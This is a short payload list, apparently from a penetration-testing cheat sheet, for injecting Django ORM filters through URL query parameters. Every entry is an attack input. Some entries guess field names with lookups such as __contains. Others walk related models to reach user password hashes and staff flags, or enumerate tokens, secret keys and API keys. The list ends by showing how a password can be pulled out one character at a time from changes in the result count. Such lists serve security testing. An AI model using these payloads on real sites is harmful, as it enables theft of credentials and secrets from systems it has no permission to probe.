# ---- Field Name Guessing via __contains ----
# Django filter parameters exposed in URL/query:
?username__contains=admin
?username__startswith=a
?username__endswith=.com
?email__icontains=admin
?password__contains=pass
?role__exact=admin
?is_admin__exact=True

# ---- Cross-Model Traversal ----
# Expose related model fields via __ traversal:
?user__username=admin
?user__is_staff=True
?user__password__startswith=$2b$
?order__user__email__contains=target
?profile__role=admin

# ---- Sensitive Field Enumeration ----
?password__isnull=False
?password__startswith=$
?token__isnull=False
?secret_key__contains=abc
?api_key__startswith=sk-

# ---- Boolean-Based ORM Extraction ----
# True: response changes (filter matches)
# False: empty response or different count
?password__startswith=a → count=X?
?password__startswith=b → count=Y?
